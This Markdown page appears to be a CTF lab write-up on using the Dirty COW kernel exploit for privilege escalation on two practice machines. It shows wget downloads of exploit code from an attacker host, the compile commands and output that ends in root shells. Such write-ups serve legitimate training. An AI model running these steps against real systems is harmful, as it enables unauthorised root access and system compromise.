---
layout: default
title: Dirty Cow
parent: Kernel Exploits
nav_order: 1
---

# Dirty Cow

---

## 4.4.0-31-generic (x86)

The Linux version is 4.4.0-31-generic which should be vulnerable to the _dirty cow_ kernel exploit.

![linpeas](../../../../assets/images/ctfs/proving_grounds/lampiao/linpeas.png)

[Dirty Cow Exploit Raw Code](https://www.exploit-db.com/exploits/40847)

Transfer the exploit to the taget machine.

```bash
tiago@lampiao:/tmp$ wget http://192.168.45.217:8000/40847.cpp
wget http://192.168.45.217:8000/40847.cpp
--2023-11-07 00:52:23--  http://192.168.45.217:8000/40847.cpp
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10531 (10K) [text/x-c++src]
Saving to: ‘40847.cpp’

100%[======================================>] 10,531      --.-K/s   in 0.003s

2023-11-07 00:52:23 (3.22 MB/s) - ‘40847.cpp’ saved [10531/10531]

```

Compile the exploit using _g++_

```bash
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
```

Now we just compile and execute the exploit and get root access.

```bash
tiago@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
<ll -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
tiago@lampiao:/tmp$ ls
ls
40847.cpp  dirtycow2  l  vmware-root
tiago@lampiao:/tmp$ ./dirtycow2
./dirtycow2
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
tiago@lampiao:/tmp$ su root
su root
Password: dirtyCowFun

root@lampiao:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)

```

## 3.2.0-4-amd64 (x64)

```bash
www-data@driftingblues:/etc$ uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux

```

3.2.0-4 is susceptible to the Dirty Cow kernel exploit.

[rverton cowroot.c github raw code](https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c)

```bash
www-data@driftingblues:/tmp$ wget http://192.168.45.217:8000/cowroot.c
--2023-11-10 13:30:30--  http://192.168.45.217:8000/cowroot.c
Connecting to 192.168.45.217:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4688 (4.6K) [text/x-csrc]
Saving to: `cowroot.c'

100%[==============================================================>] 4,688       --.-K/s   in 0s

2023-11-10 13:30:30 (9.28 MB/s) - `cowroot.c' saved [4688/4688]

# Compile the exploit locally on target
www-data@driftingblues:/tmp$ gcc cowroot.c -o cowroot -pthread

# Run exploit
www-data@driftingblues:/tmp$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 51096
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@driftingblues:/tmp# whoami
root
```
